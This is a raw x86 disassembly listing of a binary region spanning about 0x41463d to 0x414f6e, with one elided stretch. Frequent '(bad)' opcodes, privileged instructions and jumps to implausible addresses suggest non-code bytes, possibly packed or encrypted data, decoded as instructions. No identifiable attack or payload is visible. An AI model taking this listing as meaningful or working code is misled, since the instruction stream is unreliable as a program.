  41463d:	mov    al,ds:0xb062fe68
  414642:	int3   
  414643:	push   edi
  414644:	(bad)  
  414645:	leave  
  414646:	pop    esi
  414647:	test   DWORD PTR [ebx+0x4b],esp
  41464a:	test   al,0x46
  41464c:	js     0x4146b9
  41464e:	outs   dx,BYTE PTR ds:[esi]
  41464f:	popa   
  414650:	leave  
  414651:	gs es xchg edx,eax
  414654:	push   ebp
  414655:	call   0xf67e606d
  41465a:	shl    BYTE PTR [edx+0x3a],1
  41465d:	mov    eax,ds:0x42d8f381
  414662:	clc    
  414663:	(bad)  
  414664:	mov    ebp,0xcb3f50d1
  414669:	std    
  41466a:	sbb    al,0x8f
  41466c:	add    ch,ah
  41466e:	xchg   ebx,eax
  41466f:	loope  0x41462b
  414671:	adc    al,0x1b
  414673:	mov    bh,0x5b
  414675:	fldenv [edx-0x698a60f8]
  41467b:	shr    DWORD PTR [ecx+edx*1],0xf5
  41467f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414680:	cmp    ebx,esp
  414682:	cli    
  414683:	push   DWORD PTR [ebx+ebp*2+0x5cd763fa]
  41468a:	xor    esi,DWORD PTR [edi+0x6a]
  41468d:	jle    0x414661
  41468f:	push   esi
  414690:	cmovo  esi,DWORD PTR [ecx]
  414693:	jb     0x4146d1
  414695:	add    BYTE PTR [ecx+0x1d],dh
  414698:	mul    DWORD PTR [edx+eiz*8]
  41469b:	and    al,0x24
  41469d:	or     eax,0xc00dd816
  4146a2:	and    al,0x3b
  4146a4:	test   al,0xea
  4146a6:	cmp    eax,0xd0f127b1
  4146ab:	ficomp DWORD PTR [ecx+0x112e9b66]
  4146b1:	and    ebp,ebx
  4146b3:	cmp    BYTE PTR [eax],ah
  4146b5:	stos   BYTE PTR es:[edi],al
  4146b6:	cwde   
  4146b7:	push   ecx
  4146b8:	mov    ah,0x5c
  4146ba:	retf   0xee7
  4146bd:	push   cs
  4146be:	ror    ebx,cl
  4146c0:	retf   
  4146c1:	dec    ebx
  4146c2:	sbb    esi,DWORD PTR [eax-0x10186a40]
  4146c8:	enter  0xbd4b,0x30
  4146cc:	shr    BYTE PTR [edi-0x2c],1
  4146cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d0:	fistp  DWORD PTR [ebp-0x7]
  4146d3:	pop    edx
  4146d4:	enter  0x997e,0x0
  4146d8:	test   eax,0x518de6de
  4146dd:	mov    ds,WORD PTR ss:[esi]
  4146e0:	sbb    ch,BYTE PTR [esi]
  4146e2:	sbb    dh,ah
  4146e4:	push   ebp
  4146e5:	into   
  4146e6:	repz sbb BYTE PTR es:[eax],ah
  4146ea:	xor    edi,ecx
  4146ec:	and    BYTE PTR [esi],ch
  4146ee:	test   BYTE PTR [ebx-0x68e42524],bh
  4146f4:	and    edx,DWORD PTR [eax-0x47]
  4146f7:	popf   
  4146f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146f9:	icebp  
  4146fa:	xchg   ecx,eax
  4146fb:	ins    DWORD PTR es:[edi],dx
  4146fc:	push   DWORD PTR [ebp-0x2]
  4146ff:	or     esp,DWORD PTR [esi]
  414701:	cwde   
  414702:	clc    
  414703:	sub    al,0xb3
  414705:	jmp    0x8e7fccd5
  41470a:	xchg   ecx,eax
  41470b:	test   DWORD PTR [eax],eax
  41470d:	test   BYTE PTR ds:0x44f2a4b8,0xb7
  414714:	rol    BYTE PTR ds:0x92cb4f36,1
  41471a:	cdq    
  41471b:	gs mov dh,dh
  41471e:	test   al,0x83
  414720:	adc    DWORD PTR [ecx+esi*2+0x2598f22e],ebx
  414727:	(bad)  
  414728:	add    eax,0xe888ffa0
  41472d:	jge    0x4147a6
  41472f:	mov    esi,DWORD PTR [ecx+0x66]
  414732:	jmp    0x17a0aab7
  414737:	(bad)  
  414738:	sub    BYTE PTR [esi-0x3da2fbb7],al
  41473e:	push   edi
  41473f:	jb     0x4146cb
  414741:	mov    edx,0xfdeb39ca
  414746:	dec    eax
  414747:	je     0x4146e1
  414749:	sub    al,0xe1
  41474b:	stos   BYTE PTR es:[edi],al
  41474c:	mov    ecx,0xbf644f71
  414751:	add    eax,0xd707e193
  414756:	adc    eax,0xd459af44
  41475b:	mov    eax,ds:0x6fedf2cf
  414760:	add    esp,DWORD PTR [ecx]
  414762:	fistp  DWORD PTR [ebx+0x41e88c94]
  414768:	inc    ebp
  414769:	xchg   edx,eax
  41476a:	or     ecx,DWORD PTR [ecx+0x48]
  41476d:	jg     0x414771
  41476f:	push   cs
  414770:	sbb    DWORD PTR [ebx-0x11],ecx
  414773:	(bad)  
  414774:	seto   BYTE PTR [esi-0x71]
  414778:	cmp    BYTE PTR [eax+0x1e546174],cl
  41477e:	cs and eax,0xb2793c15
  414784:	call   ecx
  414786:	test   eax,0x3c56f942
  41478b:	pushf  
  41478c:	pop    edi
  41478d:	xchg   edx,eax
  41478e:	push   ebx
  41478f:	mov    edi,0x9919b9ce
  414794:	adc    al,0x38
  414796:	test   DWORD PTR [esi-0x3e],eax
  414799:	ds mov dh,0x8e
  41479c:	test   eax,0xce28c4a
  4147a1:	sbb    ch,al
  4147a3:	mov    esi,0x15d22d7d
  4147a8:	add    edx,ebx
	...
  41497e:	in     eax,dx
  41497f:	jle    0x414973
  414981:	ret    
  414982:	repz iret 
  414984:	std    
  414985:	jle    0x414966
  414987:	loope  0x4149cb
  414989:	mov    al,0x65
  41498b:	inc    edx
  41498c:	je     0x4149e4
  41498e:	push   esp
  41498f:	bound  eax,QWORD PTR [ecx]
  414991:	add    BYTE PTR ds:0x5000007,ah
  414997:	mov    esp,0x4967c1aa
  41499c:	mov    dh,0x8b
  41499e:	out    dx,al
  41499f:	jle    0x4149c0
  4149a1:	test   BYTE PTR [ecx],dl
  4149a3:	addr16 dec edi
  4149a5:	xchg   BYTE PTR [edx-0x7b],bh
  4149a8:	(bad)  
  4149a9:	push   ebp
  4149aa:	dec    esp
  4149ab:	hlt    
  4149ac:	cmp    esi,DWORD PTR [edi+0x1a]
  4149af:	pusha  
  4149b0:	dec    ebx
  4149b1:	jmp    0x894e1d8c
  4149b6:	mov    esi,0x1009073d
  4149bb:	scas   eax,DWORD PTR es:[edi]
  4149bc:	cmc    
  4149bd:	leave  
  4149be:	push   cs
  4149bf:	rcl    BYTE PTR [ecx-0x22],cl
  4149c2:	jmp    0xe3daef81
  4149c7:	(bad)  
  4149c9:	xor    al,0xcd
  4149cb:	fsin   
  4149cd:	pop    eax
  4149ce:	adc    bl,BYTE PTR ds:0x29f7c830
  4149d4:	push   esp
  4149d5:	(bad)  
  4149d6:	(bad)  
  4149d7:	push   esp
  4149d8:	(bad)  
  4149d9:	loope  0x414a5a
  4149db:	mov    ch,0xb6
  4149dd:	vpunpckhdq xmm5,xmm4,XMMWORD PTR [ebp+0x58]
  4149e2:	adc    BYTE PTR [edx],ch
  4149e4:	nop
  4149e5:	js     0x414a41
  4149e7:	lea    edi,[esp+ebx*2+0x1d0fa186]
  4149ee:	retf   
  4149ef:	lock xor edi,DWORD PTR [ecx-0x1d73f1a5]
  4149f6:	pop    edi
  4149f7:	jmp    FWORD PTR [di]
  4149fa:	push   ss
  4149fb:	jle    0x414a4d
  4149fd:	daa    
  4149fe:	mov    esi,0xa106f7cc
  414a03:	(bad)  
  414a04:	jnp    0x41499b
  414a06:	push   edx
  414a07:	addr16 mov edx,ss
  414a0a:	mov    bh,0x55
  414a0c:	aas    
  414a0d:	mov    edi,0xe02cbf66
  414a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a13:	rol    DWORD PTR [edi-0x569f876b],cl
  414a19:	aad    0x3e
  414a1b:	test   BYTE PTR [ecx+eax*8+0x780ed208],0x2d
  414a23:	mov    ebx,DWORD PTR [edx+0x36]
  414a26:	lods   al,BYTE PTR ds:[esi]
  414a27:	inc    edx
  414a28:	mov    BYTE PTR [esi+0x19f58452],0x50
  414a2f:	jmp    0xafc32502
  414a34:	sub    al,0x51
  414a36:	ror    BYTE PTR [ebp-0x6e64d0d3],cl
  414a3c:	cmc    
  414a3d:	ss jno 0x414a29
  414a40:	xlat   BYTE PTR ds:[ebx]
  414a41:	loop   0x4149e2
  414a43:	inc    edi
  414a44:	or     al,0x63
  414a46:	or     cl,BYTE PTR ds:0x861c5836
  414a4c:	mov    al,0x38
  414a4e:	mov    bl,0x40
  414a50:	adc    DWORD PTR [edx+0x49943d77],0xdaeacade
  414a5a:	xchg   edx,eax
  414a5b:	outs   dx,DWORD PTR ds:[esi]
  414a5c:	push   es
  414a5d:	leave  
  414a5e:	push   esi
  414a5f:	cmp    al,0x5d
  414a61:	push   ebx
  414a62:	mov    ecx,0x242025fe
  414a67:	jmp    0xb983:0xfd772008
  414a6e:	and    esi,edx
  414a70:	add    ch,ah
  414a72:	bound  esi,QWORD PTR [edi]
  414a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a75:	daa    
  414a76:	jo     0x414a9d
  414a78:	add    cl,ch
  414a7a:	adc    dl,dh
  414a7c:	dec    edx
  414a7d:	or     ch,BYTE PTR [ebx-0x10092e09]
  414a83:	mov    ds:0x65194c8e,eax
  414a88:	push   ecx
  414a89:	and    dh,BYTE PTR [ecx]
  414a8b:	xor    edx,DWORD PTR [esp+eax*8+0x30]
  414a8f:	and    DWORD PTR [ebx+ebx*4+0x3a0c04af],ebx
  414a96:	mov    ebx,DWORD PTR [eax-0x7b]
  414a99:	aas    
  414a9a:	xor    DWORD PTR [edx-0x51a0a45d],edi
  414aa0:	pop    ds
  414aa1:	mov    ah,0xd6
  414aa3:	push   ecx
  414aa4:	sbb    ah,BYTE PTR [edi+edx*1-0x75]
  414aa8:	xchg   BYTE PTR [ebp+0xa],dh
  414aab:	mov    edx,0x3bbf00ed
  414ab0:	cmp    BYTE PTR [esi-0x4ebb195f],cl
  414ab6:	xor    dl,BYTE PTR [edi+edi*4+0x5d]
  414aba:	sbb    DWORD PTR [ebp-0x69a6a8f3],0x80dd65c6
  414ac4:	shr    BYTE PTR [edi],0x73
  414ac7:	pop    ecx
  414ac8:	fadd   QWORD PTR [esi+0x16]
  414acb:	mov    eax,ds
  414acd:	and    ebx,DWORD PTR [eax+0x67]
  414ad0:	dec    ebx
  414ad1:	test   eax,0xab96995a
  414ad6:	je     0x414aea
  414ad8:	ds xor al,0xdf
  414adb:	stos   BYTE PTR es:[edi],al
  414adc:	mov    cl,0x75
  414ade:	daa    
  414adf:	loope  0x414aab
  414ae1:	test   BYTE PTR [ecx],cl
  414ae3:	jnp    0x414a7f
  414ae5:	idiv   DWORD PTR [edx]
  414ae7:	cmp    al,0xda
  414ae9:	es dec eax
  414aeb:	rol    DWORD PTR [esi+0x7a1e83cc],1
  414af1:	mov    bl,0x7a
  414af3:	dec    edi
  414af4:	lods   al,BYTE PTR ds:[esi]
  414af5:	dec    esp
  414af6:	das    
  414af7:	cli    
  414af8:	aaa    
  414af9:	mov    ds:0x23e942e6,al
  414afe:	jle    0x414ad9
  414b00:	dec    ecx
  414b01:	mov    edi,0x84ba3a34
  414b06:	jno    0x414af8
  414b08:	jbe    0x414ae0
  414b0a:	cmp    cl,BYTE PTR [ecx]
  414b0c:	cmp    dl,dl
  414b0e:	cwde   
  414b0f:	in     eax,dx
  414b10:	jecxz  0x414b55
  414b12:	and    edi,DWORD PTR gs:[edx-0x80]
  414b16:	add    eax,0x52e969a2
  414b1b:	les    esp,FWORD PTR [edi+0x3d]
  414b1e:	test   esi,0xfbae6f76
  414b24:	inc    esp
  414b25:	pusha  
  414b26:	imul   DWORD PTR [ebp-0x7]
  414b29:	cmp    BYTE PTR [edx-0x3c],ah
  414b2c:	inc    esp
  414b2d:	ret    0x94b5
  414b30:	(bad)  
  414b31:	icebp  
  414b32:	lock cmc 
  414b34:	retf   0x7a8a
  414b37:	jne    0x414b97
  414b39:	pop    edi
  414b3a:	dec    ebx
  414b3b:	and    dl,bl
  414b3d:	iret   
  414b3e:	scas   al,BYTE PTR es:[edi]
  414b3f:	xor    ecx,esi
  414b41:	loop   0x414af2
  414b43:	mov    esp,0x368209a0
  414b48:	stc    
  414b49:	push   cs
  414b4a:	mov    eax,DWORD PTR [ebx+0x66]
  414b4d:	inc    ebx
  414b4e:	push   ebx
  414b4f:	mov    ebp,DWORD PTR [eax+edi*4-0x245c134d]
  414b56:	jo     0x414bce
  414b58:	pop    ds
  414b59:	cdq    
  414b5a:	(bad)  
  414b5b:	pop    ds
  414b5c:	rol    DWORD PTR [edx+ebp*4],cl
  414b5f:	hlt    
  414b60:	push   edi
  414b61:	test   eax,0xb78453e3
  414b66:	adc    eax,0x432df2d
  414b6b:	xor    BYTE PTR [esi],dl
  414b6d:	push   esi
  414b6e:	dec    esp
  414b6f:	icebp  
  414b70:	stc    
  414b71:	sar    BYTE PTR [ecx+0x1f],cl
  414b74:	dec    ebp
  414b75:	adc    ecx,DWORD PTR [ebp+0x78b033da]
  414b7b:	and    bl,al
  414b7d:	rcr    BYTE PTR [ebp+0x5a],1
  414b80:	and    dl,al
  414b82:	xor    dh,BYTE PTR [edx-0x1c]
  414b85:	in     eax,dx
  414b86:	scas   eax,DWORD PTR es:[edi]
  414b87:	icebp  
  414b88:	pop    ebp
  414b89:	out    dx,al
  414b8a:	out    0x3e,al
  414b8c:	xor    BYTE PTR [edx-0x642f2432],0xb4
  414b93:	jmp    0x414b74
  414b95:	pop    es
  414b96:	neg    DWORD PTR [edx+0x48]
  414b99:	inc    ecx
  414b9a:	push   esp
  414b9b:	sub    bh,al
  414b9d:	(bad)  
  414b9f:	mov    dl,0xf7
  414ba1:	or     esi,DWORD PTR [ecx+0x65a52c64]
  414ba7:	xchg   DWORD PTR [esi-0xa],esp
  414baa:	js     0x414c0e
  414bac:	xchg   esp,eax
  414bad:	in     al,0x55
  414baf:	ds or  al,0x1e
  414bb2:	ret    0xa84a
  414bb5:	jmp    DWORD PTR [esi+ebx*4+0x47979417]
  414bbc:	pop    ecx
  414bbd:	mov    bh,al
  414bbf:	lds    esi,FWORD PTR [ebx-0xf6e2f10]
  414bc5:	push   ds
  414bc6:	pusha  
  414bc7:	xlat   BYTE PTR ds:[ebx]
  414bc8:	pusha  
  414bc9:	pop    es
  414bca:	cmc    
  414bcb:	jmp    0x2ee0:0x6789e2f0
  414bd2:	dec    ecx
  414bd3:	pop    eax
  414bd4:	pop    ebp
  414bd5:	inc    ebx
  414bd6:	xor    bl,BYTE PTR [edi-0x6b]
  414bd9:	sar    BYTE PTR [edx],0xab
  414bdc:	xor    eax,0xa419d36d
  414be1:	not    edx
  414be3:	pop    edi
  414be4:	sub    BYTE PTR [ebx-0x1d],al
  414be7:	daa    
  414be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414be9:	push   ss
  414bea:	icebp  
  414beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bec:	leave  
  414bed:	jae    0x414c52
  414bef:	adc    dl,ah
  414bf1:	outs   dx,DWORD PTR ds:[esi]
  414bf2:	add    DWORD PTR [esi-0x132d74b5],0x1e4fd0a2
  414bfc:	or     eax,0xce52f561
  414c01:	sub    eax,0xb7d50bf1
  414c06:	fidivr DWORD PTR [ecx+0x78ebda5]
  414c0c:	ret    0xde4b
  414c0f:	dec    ebp
  414c10:	push   cs
  414c11:	mov    DWORD PTR [esi+0x7ff18839],ebx
  414c17:	push   edx
  414c18:	mov    dl,0xf7
  414c1a:	and    bh,ch
  414c1c:	sbb    esp,DWORD PTR [ecx+0x1]
  414c1f:	mov    edi,0x7d93676b
  414c24:	mov    BYTE PTR [ebx-0x2f],dl
  414c27:	xchg   ebx,eax
  414c28:	push   cs
  414c29:	test   eax,0xb77b33ed
  414c2e:	push   esp
  414c2f:	aam    0x2d
  414c31:	nop
  414c32:	leave  
  414c33:	add    bl,BYTE PTR [esi+0x6e3b26cd]
  414c39:	xchg   edi,eax
  414c3a:	push   es
  414c3b:	es loopne 0x414c80
  414c3e:	jle    0x414c92
  414c40:	mov    ah,0x10
  414c42:	ficomp DWORD PTR [edi]
  414c44:	pusha  
  414c45:	rol    edx,1
  414c47:	xchg   esp,eax
  414c48:	sub    bh,BYTE PTR [edx+0x35]
  414c4b:	dec    eax
  414c4c:	add    dl,BYTE PTR [eax+esi*2]
  414c4f:	(bad)  
  414c50:	scas   eax,DWORD PTR es:[edi]
  414c51:	inc    edx
  414c52:	jle    0x414c6c
  414c54:	pop    eax
  414c55:	retf   0xc4f8
  414c58:	add    esi,eax
  414c5a:	mov    edx,0xf7ce96fd
  414c5f:	push   ds
  414c60:	mov    ds:0x65470192,eax
  414c65:	xlat   BYTE PTR ds:[ebx]
  414c66:	mov    dl,0x8b
  414c68:	daa    
  414c69:	mov    esi,0xcfbbbd1
  414c6e:	(bad)  
  414c6f:	push   edi
  414c70:	retf   
  414c71:	outs   dx,DWORD PTR ds:[esi]
  414c72:	push   ss
  414c73:	jmp    0xf760:0x87ed8c73
  414c7a:	push   ecx
  414c7b:	fsub   QWORD PTR [ebx-0x60]
  414c7e:	shl    BYTE PTR [ebx+0x41b8fbbe],1
  414c84:	test   BYTE PTR [edi],dl
  414c86:	std    
  414c87:	cmp    DWORD PTR [esi-0x59],eax
  414c8a:	cwde   
  414c8b:	cs add al,0x7
  414c8e:	mov    DWORD PTR [edi+0x2d],esi
  414c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c92:	xchg   edi,eax
  414c93:	xor    esi,ebx
  414c95:	fcmovne st,st(2)
  414c97:	mov    al,0x27
  414c99:	lock das 
  414c9b:	cmp    al,0x76
  414c9d:	pop    eax
  414c9e:	sub    ebp,DWORD PTR [eax+0x7e]
  414ca1:	inc    ebx
  414ca2:	fwait
  414ca3:	pusha  
  414ca4:	jecxz  0x414d1b
  414ca6:	inc    ebp
  414ca7:	cli    
  414ca8:	mov    ah,0x29
  414caa:	daa    
  414cab:	std    
  414cac:	dec    esi
  414cad:	push   eax
  414cae:	test   esp,0x8951e6c6
  414cb4:	outs   dx,BYTE PTR ds:[esi]
  414cb5:	cdq    
  414cb6:	scas   eax,DWORD PTR es:[edi]
  414cb7:	jecxz  0x414d33
  414cb9:	pop    ebp
  414cba:	ret    
  414cbb:	xor    DWORD PTR [edi+0x73],ebx
  414cbe:	cmp    cl,BYTE PTR [edi+0x48705a84]
  414cc4:	repnz pop esp
  414cc6:	scas   al,BYTE PTR es:[edi]
  414cc7:	aad    0x9f
  414cc9:	xor    al,0x1
  414ccb:	mov    ebx,0x4f9ce3d
  414cd0:	daa    
  414cd1:	test   DWORD PTR [esi+0x77d8e95d],ecx
  414cd7:	loop   0x414c8b
  414cd9:	fs enter 0x6e97,0x9a
  414cde:	sbb    BYTE PTR [eax],ch
  414ce0:	cmp    BYTE PTR [ebx+ebx*4+0x42b5bac3],al
  414ce7:	lock outs dx,DWORD PTR ds:[esi]
  414ce9:	jb     0x414cb7
  414ceb:	lods   al,BYTE PTR ds:[esi]
  414cec:	add    eax,0xd7bba791
  414cf1:	push   ecx
  414cf2:	js     0x414ca1
  414cf4:	(bad)  
  414cf5:	pop    esi
  414cf6:	or     al,0x1b
  414cf8:	sbb    edi,ebp
  414cfa:	xor    ch,BYTE PTR [ebx]
  414cfc:	adc    cl,ah
  414cfe:	add    eax,0x1c981279
  414d03:	and    edx,DWORD PTR [esi]
  414d05:	rcl    BYTE PTR [edx+0x3ca32008],1
  414d0b:	pop    ds
  414d0c:	stc    
  414d0d:	in     eax,dx
  414d0e:	mov    cl,0xf2
  414d10:	and    ch,BYTE PTR [ecx]
  414d12:	idiv   DWORD PTR [ebp+0x14e6e6dc]
  414d18:	inc    DWORD PTR [eax+0x50]
  414d1b:	xor    BYTE PTR [ebp-0x1b],0xba
  414d1f:	fwait
  414d20:	ins    DWORD PTR es:[edi],dx
  414d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d22:	adc    DWORD PTR [esi+0x6e],ebp
  414d25:	lock push 0x73
  414d28:	push   cs
  414d29:	push   esi
  414d2a:	push   eax
  414d2b:	add    DWORD PTR [eax-0x2e1cd3ab],esp
  414d31:	inc    edx
  414d32:	jmp    0x41affe1e
  414d37:	clc    
  414d38:	mov    BYTE PTR [ecx-0x29a318d8],0x67
  414d3f:	dec    ecx
  414d40:	xchg   esi,eax
  414d41:	imul   esp,DWORD PTR [ebx+0x53483a31],0x58
  414d48:	(bad)
  414d4b:	or     al,0xe3
  414d4d:	jno    0x414d5b
  414d4f:	sub    al,0x56
  414d51:	pop    eax
  414d52:	in     eax,0xdd
  414d54:	cmp    dh,BYTE PTR [eax]
  414d56:	pop    ecx
  414d57:	inc    ecx
  414d58:	adc    eax,0x8d0d918b
  414d5d:	inc    ecx
  414d5e:	xchg   edx,eax
  414d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d60:	pushf  
  414d61:	pop    edi
  414d62:	xchg   BYTE PTR [ebx],al
  414d64:	or     al,0x28
  414d66:	(bad)  
  414d67:	popa   
  414d68:	xchg   BYTE PTR [edi+0x57],bl
  414d6b:	xchg   esp,eax
  414d6c:	cmp    DWORD PTR [eax+0x69],ebx
  414d6f:	xchg   esp,eax
  414d70:	cwde   
  414d71:	inc    esp
  414d72:	addr16 push ss
  414d74:	(bad)  
  414d75:	fadd   QWORD PTR [ecx+0x7a6662c2]
  414d7b:	push   ss
  414d7c:	ins    BYTE PTR es:[edi],dx
  414d7d:	push   edi
  414d7e:	mov    ah,0xa1
  414d80:	mov    WORD PTR [esi+0x10e558a1],?
  414d86:	pop    ds
  414d87:	push   esp
  414d88:	iret   
  414d89:	cmp    al,0x27
  414d8b:	or     al,0x96
  414d8d:	pop    ds
  414d8e:	addr16 dec ecx
  414d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d91:	mov    ah,0xbe
  414d93:	cdq    
  414d94:	jo     0x414df7
  414d96:	dec    edx
  414d97:	test   DWORD PTR [ebp-0x59813f71],esp
  414d9d:	adc    DWORD PTR [edx+0x519ec50b],ecx
  414da3:	mov    dh,0x90
  414da5:	push   esi
  414da6:	pop    eax
  414da7:	or     esp,DWORD PTR [ebx]
  414da9:	fs xchg ebx,eax
  414dab:	xchg   edx,eax
  414dac:	jbe    0x414ddb
  414dae:	mov    cl,0x7a
  414db0:	xchg   esi,eax
  414db1:	dec    edx
  414db2:	xor    al,0x2d
  414db4:	sbb    dl,cl
  414db6:	pop    ebp
  414db7:	mov    ecx,0x803641ba
  414dbc:	sub    al,0x4b
  414dbe:	cmove  edi,DWORD PTR [ecx+eiz*4]
  414dc2:	scas   al,BYTE PTR es:[edi]
  414dc3:	and    ecx,esp
  414dc5:	jle    0x414e3c
  414dc7:	(bad)  [edi]
  414dc9:	push   cs
  414dca:	mov    ecx,0x6bb14d2b
  414dcf:	jp     0x414d58
  414dd1:	jmp    0x414d54
  414dd3:	arpl   WORD PTR [ebp+0x4f],sp
  414dd6:	add    ch,bl
  414dd8:	bound  ebp,QWORD PTR [eax-0x4cdb070b]
  414dde:	jg     0x414d7f
  414de0:	or     edi,DWORD PTR [edi+0x38]
  414de3:	ds cmp al,0xf4
  414de6:	sub    al,0x48
  414de8:	mov    eax,ds:0x80ee39e5
  414ded:	and    al,0xb
  414def:	jp     0x414e6f
  414df1:	mov    eax,0x8e1f269d
  414df6:	mov    ah,0x6c
  414df8:	cdq    
  414df9:	stos   DWORD PTR es:[edi],eax
  414dfa:	sbb    esp,eax
  414dfc:	jge    0x414e1d
  414dfe:	scas   eax,DWORD PTR es:[edi]
  414dff:	gs mov edx,0xa6ab0df5
  414e05:	mov    esi,cs
  414e07:	ds xchg ebx,eax
  414e09:	retf   0x46bd
  414e0c:	repnz scas al,BYTE PTR es:[edi]
  414e0e:	scas   eax,DWORD PTR es:[edi]
  414e0f:	xor    bh,cl
  414e11:	xor    edx,DWORD PTR [ebp+0x19]
  414e14:	(bad)  
  414e15:	push   edi
  414e16:	dec    edi
  414e17:	out    dx,eax
  414e18:	sbb    edi,esp
  414e1a:	fwait
  414e1b:	add    bh,BYTE PTR [ebp+esi*2-0x4a]
  414e1f:	test   al,0x55
  414e21:	jae    0x414e4a
  414e23:	(bad)  
  414e24:	mov    ecx,0x1150bd92
  414e29:	pop    edi
  414e2a:	xchg   esi,eax
  414e2b:	iret   
  414e2c:	aam    0xef
  414e2e:	fs mov dl,0x64
  414e31:	outs   dx,DWORD PTR ds:[esi]
  414e32:	lds    eax,FWORD PTR [ebx+0x1c]
  414e35:	add    DWORD PTR [ebx],ebp
  414e37:	push   cs
  414e38:	ds dec ebp
  414e3a:	(bad)  
  414e3b:	inc    ebp
  414e3c:	lods   eax,DWORD PTR ds:[esi]
  414e3d:	mov    edi,0xe766cb76
  414e42:	out    0xf0,eax
  414e44:	(bad)  
  414e45:	(bad)  
  414e46:	shl    BYTE PTR [ebx+0xd],1
  414e49:	jb     0x414e9f
  414e4b:	repz jbe 0x414e41
  414e4e:	lods   al,BYTE PTR ds:[esi]
  414e4f:	stos   DWORD PTR es:[edi],eax
  414e50:	lahf   
  414e51:	ins    BYTE PTR es:[edi],dx
  414e52:	iret   
  414e53:	mov    ds:0x2629587b,eax
  414e58:	jno    0x414dfc
  414e5a:	dec    ecx
  414e5b:	xlat   BYTE PTR ds:[ebx]
  414e5c:	mov    ds:0xae138228,al
  414e61:	cmc    
  414e62:	loope  0x414ed9
  414e64:	sahf   
  414e65:	in     eax,dx
  414e66:	push   ebx
  414e67:	fs cli 
  414e69:	pop    ebx
  414e6a:	or     dl,BYTE PTR [edx]
  414e6c:	sar    al,1
  414e6e:	loop   0x414eb6
  414e70:	js     0x414eda
  414e72:	loope  0x414e6f
  414e74:	push   esp
  414e75:	stos   BYTE PTR es:[edi],al
  414e76:	rol    BYTE PTR [ebx+0x48],cl
  414e79:	pop    ebx
  414e7a:	ins    DWORD PTR es:[edi],dx
  414e7b:	mov    ds:0x6374d1f8,eax
  414e80:	pop    ebx
  414e81:	mov    ah,0xe1
  414e83:	inc    DWORD PTR [edi-0x3ec4e534]
  414e89:	mov    BYTE PTR [esi+ecx*2],bl
  414e8c:	push   esp
  414e8d:	xchg   ecx,ebp
  414e8f:	push   edx
  414e90:	mov    cl,dh
  414e92:	sub    BYTE PTR [ebx],bh
  414e94:	sahf   
  414e95:	fld    QWORD PTR [eax]
  414e97:	and    al,0x22
  414e99:	pop    edi
  414e9a:	fisttp WORD PTR [eax+0x4cd03790]
  414ea0:	xchg   ebp,eax
  414ea1:	jp     0x414eae
  414ea3:	fisttp DWORD PTR [esi]
  414ea5:	fwait
  414ea6:	xchg   esp,eax
  414ea7:	icebp  
  414ea8:	cmp    esi,DWORD PTR gs:[esi-0x71935d1]
  414eaf:	ja     0x414f17
  414eb1:	test   al,0xa3
  414eb3:	mov    dh,0x79
  414eb5:	sbb    edi,ecx
  414eb7:	mov    ax,ds:0x634959c9
  414ebd:	inc    eax
  414ebe:	bnd js 0x414e93
  414ec1:	and    al,BYTE PTR [edi]
  414ec3:	aaa    
  414ec4:	adc    BYTE PTR [edi+0xe],bl
  414ec7:	inc    eax
  414ec8:	cmp    al,0x6d
  414eca:	xchg   edi,eax
  414ecb:	out    dx,al
  414ecc:	pop    ebp
  414ecd:	cmp    al,0x4d
  414ecf:	or     bh,BYTE PTR [eax+0x266a38e4]
  414ed5:	xchg   ebp,eax
  414ed6:	(bad)  
  414ed7:	or     al,0xa4
  414ed9:	(bad)  
  414eda:	repnz push esi
  414edc:	int3   
  414edd:	xchg   ebp,eax
  414ede:	retf   
  414edf:	cmp    eax,0x30cd2e91
  414ee4:	dec    esi
  414ee5:	aam    0xce
  414ee7:	cld    
  414ee8:	rcr    BYTE PTR [ecx-0x54],cl
  414eeb:	inc    eax
  414eec:	test   al,0x34
  414eee:	sbb    eax,0xf0d00d56
  414ef3:	cwde   
  414ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ef5:	add    bl,BYTE PTR [edx+ebx*8-0x1c8944cf]
  414efc:	aas    
  414efd:	enter  0xce62,0xf2
  414f01:	mov    WORD PTR [esi+0x4b346b2f],?
  414f07:	pop    edx
  414f08:	sahf   
  414f09:	sub    edx,DWORD PTR [eax-0x34]
  414f0c:	retf   0xe152
  414f0f:	dec    ebx
  414f10:	xor    eax,0xe32b9a84
  414f15:	bound  ecx,QWORD PTR [ebx+0x59]
  414f18:	cmp    al,0x1f
  414f1a:	in     eax,0x9e
  414f1c:	and    eax,0xd97f8270
  414f21:	xchg   DWORD PTR [edx],edi
  414f23:	test   eax,0xc1dcac3a
  414f28:	pop    ecx
  414f29:	scas   eax,DWORD PTR es:[edi]
  414f2a:	(bad)  
  414f2b:	pop    ebx
  414f2c:	adc    al,0x2a
  414f2e:	sub    BYTE PTR [edi-0x3a6ade3d],0xa3
  414f35:	inc    ebp
  414f36:	loope  0x414f81
  414f38:	push   ecx
  414f39:	mov    edx,0x90d86e5e
  414f3e:	dec    edi
  414f3f:	outs   dx,BYTE PTR ds:[esi]
  414f40:	jg     0x414f70
  414f42:	pushf  
  414f43:	fwait
  414f44:	aad    0x32
  414f46:	xor    DWORD PTR [edx+0x55aa5c59],ecx
  414f4c:	fiadd  DWORD PTR [esi+edx*1]
  414f4f:	cmp    al,0x40
  414f51:	jne    0x414ed4
  414f53:	mov    BYTE PTR [edx-0x20],cl
  414f56:	dec    ebp
  414f57:	sub    ebx,DWORD PTR [ebx+0x82b59a5]
  414f5d:	pop    esi
  414f5e:	mov    ebx,0xeae0f16e
  414f63:	nop
  414f64:	daa    
  414f65:	add    dh,BYTE PTR [ebx-0x5]
  414f68:	or     DWORD PTR [eax+eax*1+0x7f],ebp
  414f6c:	push   edi
  414f6d:	std    
  414f6e:	stc    
